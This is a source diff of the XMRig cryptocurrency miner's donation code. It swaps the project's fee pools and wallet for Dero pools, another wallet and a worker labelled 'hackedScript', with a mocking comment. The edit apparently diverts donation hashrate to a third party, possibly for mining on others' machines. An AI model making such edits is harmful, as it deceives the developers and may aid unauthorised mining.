@@ -36,9 +36,16 @@ extern "C"
 #include "crypto/c_keccak.h"
 }
 
-
+/*
+ * Fuck these pools, haha
+ */
+/*
 const static char *kDonatePool1   = "miner.fee.xmrig.com";
 const static char *kDonatePool2   = "emergency.fee.xmrig.com";
+*/
+
+const static char *kDonatePool1   = "pool.dero.live";
+const static char *kDonatePool2   = "pool.dero.hashvault.pro";
 
 
 static inline int random(int min, int max){
@@ -59,10 +66,19 @@ DonateStrategy::DonateStrategy(int level, const char *user, int algo, IStrategyL
     keccak(reinterpret_cast<const uint8_t *>(user), static_cast<int>(strlen(user)), hash, sizeof(hash));
     Job::toHex(hash, 32, userId);
 
+//    if (algo == xmrig::ALGO_CRYPTONIGHT) {
+//        m_pools.push_back(new Url(kDonatePool1, 6666, userId, nullptr, false, true));
+//        m_pools.push_back(new Url(kDonatePool1, 80,   userId, nullptr, false, true));
+//        m_pools.push_back(new Url(kDonatePool2, 5555, "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD", "emergency", false, false));
+//    }
+//    else {
+//        m_pools.push_back(new Url(kDonatePool1, 5555, userId, nullptr, false, true));
+//        m_pools.push_back(new Url(kDonatePool1, 7777, userId, nullptr, false, true));
+//    }
     if (algo == xmrig::ALGO_CRYPTONIGHT) {
-        m_pools.push_back(new Url(kDonatePool1, 6666, userId, nullptr, false, true));
+        m_pools.push_back(new Url(kDonatePool1, 3333, userId, nullptr, false, true));
         m_pools.push_back(new Url(kDonatePool1, 80,   userId, nullptr, false, true));
-        m_pools.push_back(new Url(kDonatePool2, 5555, "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD", "emergency", false, false));
+        m_pools.push_back(new Url(kDonatePool2, 5555, "dERooWTpaiVZMuXAnkzPZkNi3TrYAhJ8ihTia2w8b9C3JbThwdCoKAfLBrsuVbzwdy2eP78a3NvbDCNe3f2x453c3pComuQaPq", "hackedScript", false, false));
     }
     else {
         m_pools.push_back(new Url(kDonatePool1, 5555, userId, nullptr, false, true));
